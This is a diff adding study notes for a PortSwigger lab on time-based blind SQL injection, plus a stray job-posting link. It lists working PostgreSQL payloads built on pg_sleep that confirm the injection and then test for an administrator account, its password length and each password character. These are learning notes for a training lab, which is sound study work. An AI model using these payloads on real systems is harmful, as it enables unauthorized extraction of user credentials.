@@ -1,0 +1,28 @@
+Lab Link: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval
+
+https://wolfe-llc.breezy.hr/p/fc15b1da38b1-security-analyst
+
+
+step 1: Check for time delay 
+    sql query: select tracking-id from tracking-table where trackingid = 'lQ9k8pEkdK3KkV9f'
+    malicious query: select tracking-id from tracking-table where trackingid = 'lQ9k8pEkdK3KkV9f' || (SELECT pg_sleep(10)) --
+    => '|| (SELECT pg_sleep(10)) --
+
+
+step 2: Check for time delay with cheat sheet
+    Example: => SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+    payload : => '|| (SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END) --
+
+step 3: check for users table and username Administrator are in the table
+    payload : => '|| (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+
+
+step 4: check for length of password 
+    payload : => '|| (SELECT CASE WHEN (username='administrator' and LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+
+
+step 5: password check
+    payload : => '|| (SELECT CASE WHEN (username='administrator' and substr(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END from users) --
+
+
+    
